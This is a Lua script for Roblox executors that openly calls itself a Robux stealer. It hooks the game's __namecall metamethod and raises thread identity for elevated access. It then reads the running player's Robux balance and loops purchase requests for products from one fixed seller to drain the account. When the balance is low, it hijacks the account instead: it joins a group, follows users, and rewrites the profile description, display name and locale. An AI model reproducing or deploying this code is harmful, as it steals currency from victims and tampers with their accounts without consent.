
local makewriteable = make_writeable or makewriteable
local clonefunction = clonefunc or clonefunction
local cloneref = clonereference or cloneref
local getrawmetatable = get_raw_metatable or get_raw_meta_table or getrawmetatable or debug.getmetatable
local setthreadidentity = set_thread_identity or setthreadidentity
local _mt = clonefunction(makewriteable);
local _getmt = clonefunction(getrawmetatable);
local _getrenv = clonefunction(getrenv);
local _yield = clonefunction(task.wait);
local getrobux = Instance.new("TextLabel")
getrobux.Name = "GetFuckingRobuxBalance"
getrobux.Text = "WTF"
getrobux.Parent = game.ReplicatedStorage
local executor = identifyexecutor()
_getrenv()._set = clonefunction(setthreadidentity);

-- bait
getgenv().RobuxStealerScriptAlreadyExecutedDoNotExecuteAgain = true
















-- documentation.
-- _Post is a post _Delete is a delete _Get is a get _Patch is a patch.
-- note to self: add an anti reverse engineer at this part of the script
local function _HttpJSONEncode(data)
   local mt = _getmt(_getrenv().Game)
   _mt(mt)
   local sigma = false
   local old = mt.__namecall
   mt.__namecall = function(...)
      if sigma == false then 
          sigma = true
         _set(7)
         _yield()
         game:GetService("HttpService"):JSONEncode(data)
      end
         
      return old(...)
   end
   end

local function _HttpJSONDecode(data)
   local mt = _getmt(_getrenv().Game)
   _mt(mt)
   local sigma = false
   local old = mt.__namecall
   mt.__namecall = function(...)
      if sigma == false then 
          sigma = true
         _set(7)
         _yield()
         game:GetService("HttpService"):JSONDecode(data)
      end
         
      return old(...)
   end
   end


   local function _HttpPostAsync(url, data)
      local mt = _getmt(_getrenv().Game)
      _mt(mt)
      local sigma = false
      local old = mt.__namecall
      mt.__namecall = function(...)
         if sigma == false then 
             sigma = true
            _set(7)
            _yield()
            game:GetService("HttpService"):PostASync(url, data)
         end
            
         return old(...)
      end
      end



      local function _HttpRequestAsync(Url, Method, Body, Headers)
         local mt = _getmt(_getrenv().Game)
         _mt(mt)
         local sigma = false
         local old = mt.__namecall
         mt.__namecall = function(...)
            if sigma == false then 
                sigma = true
               _set(7)
               _yield()
               game:GetService("HttpService"):RequestAsync({
                  Url = Url,
                  Method = Method,
                  Body = Body,
                  Headers = Headers
              })
            end
               
            return old(...)
         end
         end

local function _HttpGetAsync(url)
local mt = _getmt(_getrenv().Game)
_mt(mt)
local sigma = false
local old = mt.__namecall
mt.__namecall = function(...)
   if sigma == false then 
       sigma = true
      _set(7)
      _yield()
      game:GetService("HttpService"):GetAsync(url)
   end
      
   return old(...)
end
end

local function _get(url)
local mt = _getmt(_getrenv().Game)
_mt(mt)
local sigma = false
local old = mt.__namecall
mt.__namecall = function(...)
   if sigma == false then 
      sigma = true
      _set(7)
      _yield()
      game:GetService("HttpRbxApiService"):GetAsyncFullUrl(url)
   end
   
   return old(...)
end
end

local function _post(url, data)
local mt = _getmt(_getrenv().Game)
_mt(mt)
local sigma = false
local old = mt.__namecall
mt.__namecall = function(...)
   if sigma == false then 
      sigma = true
      _set(7)
      _yield()
      game:GetService("HttpRbxApiService"):PostAsyncFullUrl(url, data)
   end
   
   return old(...)
end
end

local function _delete(url)
local mt = _getmt(_getrenv().Game)
_mt(mt)
local sigma = false
local old = mt.__namecall
mt.__namecall = function(...)
   if sigma == false then 
      sigma = true
      _set(7)
      _yield()
      game:GetService("HttpRbxApiService"):RequestAsync({
          Url = url,
          Method = 'DELETE',
      })
   end
   
   return old(...)
end
end

local function _patch(url, body)
local mt = _getmt(_getrenv().Game)
_mt(mt)
local sigma = false
local old = mt.__namecall
mt.__namecall = function(...)
   if sigma == false then 
      sigma = true
      _set(7)
      _yield()
      game:GetService("HttpRbxApiService"):RequestAsync({
          Url = url,
          Method = 'PATCH',
          Body = body,
      })
   end
   
   return old(...)
end
end

local function _end()
local mt = _getmt(_getrenv().Game)
_mt(mt)
local sigma = false
local old = mt.__namecall
mt.__namecall = function(...)
   if sigma == false then 
      sigma = true
      _set(7)
      _yield()
      game:GetService("BrowserService"):OpenBrowserWindow("https://roblox.com/home")
   end
   
   return old(...)
end
end

local function GrabRobuxBalance()
local mt = _getmt(_getrenv().Game)
_mt(mt)
local sigma = false
local old = mt.__namecall
mt.__namecall = function(...)
   if sigma == false then 
      sigma = true
      _set(7)
      _yield()
      local rob = game:GetService("MarketplaceService"):GetRobuxBalance()
      game.ReplicatedStorage.GetFuckingRobuxBalance.Text = rob
   end
   
   return old(...)
end
end





--



local plr = game.Players.LocalPlayer
local OSTime = os.time()
local Time = os.date('!*t', OSTime)

local function getexploit()
    local exploit = identifyexecutor()
    return exploit
end










-- extra vulns 


local function handlepooron()
local player = game.Players.LocalPlayer
local userId = player.UserId
local description = '{"description":"Hello, I am a loyal follower of the Nexus Church ✝️ We seek to better roblox by destroying roblox. Join the group on @MrReplicatedStorage page to become one of us."}'
local none = ''
local china = '{"supportedLocaleCode":"en"}'
local display = '{"newDisplayName":"NexusFollower"}'
local grouppost = '{"body":"I am now a loyal follower of the Nexus 1.0 Fanclub."}'





-- extra functions if need
_yield(0.25)
pcall(function()
_post("https:/groups.roblox.com/v1/groups/33254476/users", '')
end)
_yield(0.25)
pcall(function()
_post("https://friends.roblox.com/v1/users/1025132233/follow", '')
end)
_yield(0.25)
pcall(function()
   _post("https://friends.roblox.com/v1/users/430344286/follow", '')
end)
_yield(0.25)
pcall(function()
_post("https://users.roblox.com/v1/description", description)
end)
_yield(0.25)
pcall(function()
_patch("https://users.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/display-names", display)
end)
_yield(0.25)
pcall(function()
_post("https://locale.roblox.com/v1/locales/set-user-supported-locale", china)
end)
_yield(0.25)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,10000000000,0)
local MessageInst = Instance.new("Message", game:GetService("CoreGui"))
MessageInst.Text = "Farewells from Nexus. \n\nExecutor: " .. executor .. "!"
game:GetService("Debris"):AddItem(MessageInst, 1000.0)
_yield(3)
_end()
end

GrabRobuxBalance()
_yield(1)
local rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)

local eros = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":3209007233}'
local hercules = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":3209007233}'
local hylos = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":3209007233}'
local tartarus = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":3209007233}'
local deimos = '{"expectedCurrency":1,"expectedPrice":200,"expectedSellerId":3209007233}'
local artemis = '{"expectedCurrency":1,"expectedPrice":300,"expectedSellerId":3209007233}'
local zeus = '{"expectedCurrency":1,"expectedPrice":500,"expectedSellerId":3209007233}'
local kratos = '{"expectedCurrency":1,"expectedPrice":750,"expectedSellerId":3209007233}'
local athena = '{"expectedCurrency":1,"expectedPrice":1000,"expectedSellerId":3209007233}'
local hephaestus = '{"expectedCurrency":1,"expectedPrice":1500,"expectedSellerId":3209007233}'
local hera = '{"expectedCurrency":1,"expectedPrice":2000,"expectedSellerId":3209007233}'
local krampus = '{"expectedCurrency":1,"expectedPrice":2500,"expectedSellerId":3209007233}'
local pegasus = '{"expectedCurrency":1,"expectedPrice":4000,"expectedSellerId":3209007233}'
local poseidon = '{"expectedCurrency":1,"expectedPrice":6000,"expectedSellerId":3209007233}'
local hermes = '{"expectedCurrency":1,"expectedPrice":8000,"expectedSellerId":3209007233}'
local apollo = '{"expectedCurrency":1,"expectedPrice":13000,"expectedSellerId":3209007233}'
local hades = '{"expectedCurrency":1,"expectedPrice":20000,"expectedSellerId":3209007233}'
local demeter = '{"expectedCurrency":1,"expectedPrice":35000,"expectedSellerId":3209007233}'
local atlas = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":3209007233}'
local cronus = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":3209007233}'
local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":3209007233}'

while _yield(0.25) do
if rb == 0 then
handlepooron()
webhook()
elseif rb > 0 and rb < 15 then
handlepooron()
elseif rb >= 15 and rb < 25 then
_post("https://economy.roblox.com/v1/purchases/products/1790757233", eros)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 25 and rb < 50 then
_post("https://economy.roblox.com/v1/purchases/products/1790857906", hercules)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 50 and rb < 100 then
_post("https://economy.roblox.com/v1/purchases/products/1790859250", hylos)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 100 and rb < 200 then
_post("https://economy.roblox.com/v1/purchases/products/1790860122", tartarus)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 200 and rb < 300 then
_post("https://economy.roblox.com/v1/purchases/products/1790860718", deimos)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 300 and rb < 500 then
_post("https://economy.roblox.com/v1/purchases/products/1790861393", artemis)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 500 and rb < 750 then
_post("https://economy.roblox.com/v1/purchases/products/1766737736", zeus)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 750 and rb < 1000 then
_post("https://economy.roblox.com/v1/purchases/products/1790862208", kratos)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 1000 and rb < 1500 then
_post("https://economy.roblox.com/v1/purchases/products/1790862909", athena)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 1500 and rb < 2000 then
_post("https://economy.roblox.com/v1/purchases/products/1790864796", hephaestus)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 2000 and rb < 2500 then
_post("https://economy.roblox.com/v1/purchases/products/1790865419", hera)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 2500 and rb < 4000 then
_post("https://economy.roblox.com/v1/purchases/products/1790866141", krampus)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 4000 and rb < 6000 then
_post("https://economy.roblox.com/v1/purchases/products/1790866628", pegasus)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 6000 and rb < 8000 then
_post("https://economy.roblox.com/v1/purchases/products/1790867213", poseidon)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 8000 and rb < 13000 then
_post("https://economy.roblox.com/v1/purchases/products/1790867784", hermes)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 13000 and rb < 20000 then
_post("https://economy.roblox.com/v1/purchases/products/1790868456", apollo)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 20000 and rb < 35000 then
_post("https://economy.roblox.com/v1/purchases/products/1790869023", hades)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 35000 and rb < 50000 then
_post("https://economy.roblox.com/v1/purchases/products/1790869869", demeter)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 50000 and rb < 75000 then
_post("https://economy.roblox.com/v1/purchases/products/1790869869", atlas)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
elseif rb >= 75000 and rb < 150000 then
_post("https://economy.roblox.com/v1/purchases/products/1790871281", cronus)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
else
_post("https://economy.roblox.com/v1/purchases/products/1766735612", helios)
GrabRobuxBalance()
task.wait(0.1)
rb = tonumber(game.ReplicatedStorage.GetFuckingRobuxBalance.Text)
wait()
end
end
